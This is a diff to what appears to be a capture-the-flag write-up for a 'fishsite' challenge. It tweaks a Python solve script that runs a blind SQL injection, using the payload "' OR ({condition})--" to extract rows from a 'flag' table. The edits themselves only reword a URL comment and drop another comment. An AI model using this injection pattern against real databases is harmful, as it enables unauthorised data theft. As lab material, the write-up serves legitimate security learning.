@@ -118,7 +118,7 @@ Solve code: (this is after binary searching for table names and finding "flag")
 ```
 import requests
 
-url = "https://fishsite-a32d72b4635a88d5.challenges.2025.vuwctf.com"  # Replace with actual target
+url = "https://fishsite-a32d72b4635a88d5.challenges.2025.vuwctf.com"  # replace with your url
 
 def check(condition):
     payload = f"' OR ({condition})--"
@@ -142,7 +142,6 @@ def extract_string(query):
         print(f"{result}")
     return result
 
-# extracting all columns with *x``
 print("extracting from flag table...")
 flag = extract_string("SELECT * FROM flag LIMIT 1")
 print(f"\nResult: {flag}\n")
